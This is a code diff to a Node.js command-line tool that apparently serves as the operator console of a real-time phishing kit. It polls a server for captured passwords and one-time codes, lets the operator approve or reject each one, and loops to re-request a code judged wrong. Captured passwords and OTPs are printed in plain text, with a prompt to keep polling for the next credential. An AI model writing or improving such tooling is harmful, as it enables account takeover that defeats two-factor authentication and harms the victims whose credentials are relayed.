@@ -97,6 +97,38 @@ async function rejectPassword() {
   }
 }
 
+// Approve OTP
+async function approveOTP() {
+  try {
+    const response = await fetch(`${API_BASE}/test/approve`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' }
+    });
+    const data = await response.json();
+    console.log('✅ OTP approved');
+    return true;
+  } catch (error) {
+    console.error('❌ Error approving OTP:', error.message);
+    return false;
+  }
+}
+
+// Reject OTP
+async function rejectOTP() {
+  try {
+    const response = await fetch(`${API_BASE}/test/reject`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' }
+    });
+    const data = await response.json();
+    console.log('❌ OTP rejected');
+    return true;
+  } catch (error) {
+    console.error('❌ Error rejecting OTP:', error.message);
+    return false;
+  }
+}
+
 // Reset credentials
 async function resetCredentials() {
   try {
@@ -137,26 +169,75 @@ async function main() {
       // Approve password
       await approvePassword();
       
-      // Step 3: Poll for OTP
-      const otp = await pollForOTP();
-      
-      console.log('\n✅ OTP verification complete!');
-      console.log(`   Password: ${password}`);
-      console.log(`   OTP: ${otp}`);
-      
-      // Reset credentials after OTP received
-      await resetCredentials();
-      
-      // Ask if user wants to continue polling
-      const continuePolling = await askQuestion('\n❓ Continue polling for next credential? (y/n): ');
-      
-      if (continuePolling.toLowerCase() !== 'y') {
-        console.log('\n👋 Exiting CLI tool...');
-        rl.close();
-        process.exit(0);
+      // Step 3: Poll for OTP with retry loop
+      let otpVerified = false;
+      while (!otpVerified) {
+        const otp = await pollForOTP();
+        
+        // Step 4: Ask user if OTP is valid
+        const otpAnswer = await askQuestion('\n❓ Is the OTP correct? (y/n): ');
+        
+        if (otpAnswer.toLowerCase() === 'n') {
+          // Reject and re-poll for OTP only
+          await rejectOTP();
+          console.log('\n🔄 Re-polling for OTP...\n');
+          // Continue the OTP loop, not the main loop
+        } else if (otpAnswer.toLowerCase() === 'y') {
+          // Approve OTP
+          await approveOTP();
+          
+          console.log('\n✅ OTP verification complete!');
+          console.log(`   Password: ${password}`);
+          console.log(`   OTP: ${otp}`);
+          
+          // Reset credentials after OTP received
+          // await resetCredentials();
+          
+          otpVerified = true;
+          
+          // Ask if user wants to continue polling
+          const continuePolling = await askQuestion('\n❓ Continue polling for next credential? (y/n): ');
+          
+          if (continuePolling.toLowerCase() !== 'y') {
+            console.log('\n👋 Exiting CLI tool...');
+            rl.close();
+            process.exit(0);
+          }
+          
+          console.log('\n🔄 Restarting polling...\n');
+        } else {
+          console.log('⚠️  Invalid input. Please enter "y" or "n".');
+          // Ask again without restarting the loop
+          const retryOtpAnswer = await askQuestion('❓ Is the OTP correct? (y/n): ');
+          
+          if (retryOtpAnswer.toLowerCase() === 'n') {
+            await rejectOTP();
+            console.log('\n🔄 Re-polling for OTP...\n');
+            // Continue the OTP loop
+          } else if (retryOtpAnswer.toLowerCase() === 'y') {
+            await approveOTP();
+            
+            console.log('\n✅ OTP verification complete!');
+            console.log(`   Password: ${password}`);
+            console.log(`   OTP: ${otp}`);
+            
+            // Reset credentials after OTP received
+            await resetCredentials();
+            
+            otpVerified = true;
+            
+            const continuePolling = await askQuestion('\n❓ Continue polling for next credential? (y/n): ');
+            
+            if (continuePolling.toLowerCase() !== 'y') {
+              console.log('\n👋 Exiting CLI tool...');
+              rl.close();
+              process.exit(0);
+            }
+            
+            console.log('\n🔄 Restarting polling...\n');
+          }
+        }
       }
-      
-      console.log('\n🔄 Restarting polling...\n');
     } else {
       console.log('⚠️  Invalid input. Please enter "y" or "n".');
       // Ask again without restarting the loop
@@ -168,24 +249,72 @@ async function main() {
         continue;
       } else if (retryAnswer.toLowerCase() === 'y') {
         await approvePassword();
-        const otp = await pollForOTP();
         
-        console.log('\n✅ OTP verification complete!');
-        console.log(`   Password: ${password}`);
-        console.log(`   OTP: ${otp}`);
-        
-        // Reset credentials after OTP received
-        await resetCredentials();
-        
-        const continuePolling = await askQuestion('\n❓ Continue polling for next credential? (y/n): ');
-        
-        if (continuePolling.toLowerCase() !== 'y') {
-          console.log('\n👋 Exiting CLI tool...');
-          rl.close();
-          process.exit(0);
+        // Poll for OTP with retry loop
+        let otpVerified = false;
+        while (!otpVerified) {
+          const otp = await pollForOTP();
+          
+          // Ask user if OTP is valid
+          const otpAnswer = await askQuestion('\n❓ Is the OTP correct? (y/n): ');
+          
+          if (otpAnswer.toLowerCase() === 'n') {
+            await rejectOTP();
+            console.log('\n🔄 Re-polling for OTP...\n');
+            // Continue the OTP loop
+          } else if (otpAnswer.toLowerCase() === 'y') {
+            await approveOTP();
+            
+            console.log('\n✅ OTP verification complete!');
+            console.log(`   Password: ${password}`);
+            console.log(`   OTP: ${otp}`);
+            
+            // Reset credentials after OTP received
+            await resetCredentials();
+            
+            otpVerified = true;
+            
+            const continuePolling = await askQuestion('\n❓ Continue polling for next credential? (y/n): ');
+            
+            if (continuePolling.toLowerCase() !== 'y') {
+              console.log('\n👋 Exiting CLI tool...');
+              rl.close();
+              process.exit(0);
+            }
+            
+            console.log('\n🔄 Restarting polling...\n');
+          } else {
+            console.log('⚠️  Invalid input. Please enter "y" or "n".');
+            const retryOtpAnswer = await askQuestion('❓ Is the OTP correct? (y/n): ');
+            
+            if (retryOtpAnswer.toLowerCase() === 'n') {
+              await rejectOTP();
+              console.log('\n🔄 Re-polling for OTP...\n');
+              // Continue the OTP loop
+            } else if (retryOtpAnswer.toLowerCase() === 'y') {
+              await approveOTP();
+              
+              console.log('\n✅ OTP verification complete!');
+              console.log(`   Password: ${password}`);
+              console.log(`   OTP: ${otp}`);
+              
+              // Reset credentials after OTP received
+              await resetCredentials();
+              
+              otpVerified = true;
+              
+              const continuePolling = await askQuestion('\n❓ Continue polling for next credential? (y/n): ');
+              
+              if (continuePolling.toLowerCase() !== 'y') {
+                console.log('\n👋 Exiting CLI tool...');
+                rl.close();
+                process.exit(0);
+              }
+              
+              console.log('\n🔄 Restarting polling...\n');
+            }
+          }
         }
-        
-        console.log('\n🔄 Restarting polling...\n');
       }
     }
   }
